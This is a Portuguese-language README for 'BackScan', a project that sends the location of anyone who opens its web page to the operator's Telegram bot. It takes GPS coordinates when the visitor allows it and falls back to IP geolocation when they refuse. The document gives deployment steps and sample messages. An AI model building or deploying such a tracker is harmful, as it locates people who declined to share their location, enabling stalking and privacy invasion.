
# 📍 BackScan - Envio Automático de Localização para o Telegram

Este projeto permite capturar e enviar automaticamente a localização do usuário para um Bot no Telegram, utilizando **GPS** (quando o usuário permite) ou **IP** (quando ele nega ou não autoriza).

Tudo isso rodando 100% online, sem necessidade de servidor próprio — hospedado na **Vercel**.

---

## 🚀 Como Funciona

Quando o usuário acessa a página:

✅ Se aceitar o compartilhamento de localização → Captura precisa via **GPS**  
❌ Se negar → Captura aproximada via **IP**

A localização obtida é enviada automaticamente para o **Telegram**.

---

## 🗂️ Estrutura do Projeto

```
/
├── api
│   └── send-location.js   → Função Serverless que envia a localização para o Telegram
├── public
│   ├── index.html         → Página exibida para o usuário
│   └── styles.css         → Estilo visual da página
├── package.json           → Dependências do projeto (axios)
└── package-lock.json      → Controle de versão das dependências
```

✅ O arquivo **package.json** é essencial para que a Vercel instale as dependências.  
✅ O arquivo **package-lock.json** é opcional, mas recomendado para travar versões.

---

## ⚙️ Passos para Configuração

### 1) Criar um Bot no Telegram

No Telegram, procure por **@BotFather**

Envie o comando:

```
/newbot
```

Siga as instruções e crie o nome e o username do seu bot.

O BotFather irá gerar um **TOKEN**.  
Guarde este token. Exemplo:

```
7246XXXXXXXXX:AAHLxxxxxxxxyyyyzzzz
```

---

### 2) Obter o ID do seu Chat

Para saber o ID do seu chat:

1. Envie qualquer mensagem para o seu bot.
2. No navegador, acesse:

```
https://api.telegram.org/botSEU_BOT_TOKEN/getUpdates
```

Copie o valor do campo:

```json
"chat": { "id": 123456789 }
```

Esse é o **Chat ID**.

---

### 3) Fazer Fork ou Clonar este Repositório

Você pode fazer um Fork ou clonar este projeto no GitHub.

Exemplo:

```bash
git clone https://github.com/seu-usuario/backscan-api.git
cd backscan-api
```

---

### 4) Criar uma Conta na Vercel

Acesse: [https://vercel.com](https://vercel.com)

Faça login (pode usar sua conta do GitHub)

Clique em **New Project → Import Git Repository**

Selecione o repositório do **BackScan**

No final do processo, clique em **Deploy**

---

### 5) Configurar Variáveis de Ambiente na Vercel

Depois do deploy:

No painel do seu projeto na Vercel, clique em:

**Settings → Environment Variables**

Crie as seguintes variáveis:

| Nome                | Valor                     |
|--------------------|---------------------------|
| TELEGRAM_BOT_TOKEN | O Token do seu bot        |
| TELEGRAM_CHAT_ID   | O ID do seu chat ou grupo |

Clique em **Save** e depois em **Redeploy**

---

## ✅ Pronto!

Agora você pode acessar seu projeto:

```
https://seu-projeto.vercel.app
```

Ao abrir a página:

- Se permitir a localização → será enviada via **GPS**
- Se negar → será capturada via **IP**

Você receberá uma mensagem no Telegram informando a localização e a fonte (**GPS** ou **IP**).

---

## 📥 Exemplo de Mensagem no Telegram

Se o usuário permitir:

```
📍 Localização recebida
Fonte: Precisa (GPS)
Latitude: -15.793889
Longitude: -47.882778
Maps: https://www.google.com/maps?q=-15.793889,-47.882778
```

Se o usuário negar:

```
📍 Localização recebida
Fonte: Aproximada (IP)
Latitude: -15.7801
Longitude: -47.9292
Maps: https://www.google.com/maps?q=-15.7801,-47.9292
```

⚠️ Localização aproximada via IP. Pode não ser precisa.

---

## ✅ Tecnologias utilizadas

- Node.js (Serverless Function na Vercel)
- HTML/CSS
- JavaScript (Geolocation API + fetch)
- Telegram Bot API
- ipapi.co (para fallback via IP)

---

## 📄 Licença

Este projeto foi desenvolvido para fins educacionais e pode ser utilizado e adaptado livremente.
